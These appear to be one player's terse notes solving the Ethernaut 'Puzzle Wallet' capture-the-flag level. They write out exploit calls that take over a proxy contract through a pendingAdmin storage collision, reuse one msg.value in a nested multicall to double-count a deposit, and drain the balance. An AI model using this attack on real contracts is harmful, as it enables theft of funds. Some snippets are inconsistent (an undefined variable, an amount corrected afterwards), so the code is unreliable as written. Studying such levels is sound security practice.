Remix to launch interface for Proxy @ instance address
Set pendingAdmin which overrides owner in PuzzleWallet contract

Overcome 'deposit' check by using a 'multicall' to multicall as the second item in array
value is persisted resulting in 1 eth being deposited twice
var {data: Deposit } = await contract.deposit.request()
var { data: MultiCall } = await contract.multicall.request([puzzleDeposit])
contract.multicall([Deposit, MultiCall], {value: web3.utils.toWei('1', 'ether')})

get rid of account balance by sending to account zero
contract.execute(player, 2, "0x")

...........arghhhhhhhhhhhhhhhhhhhhhh
needed web3.utils.toWei('2', 'ether')
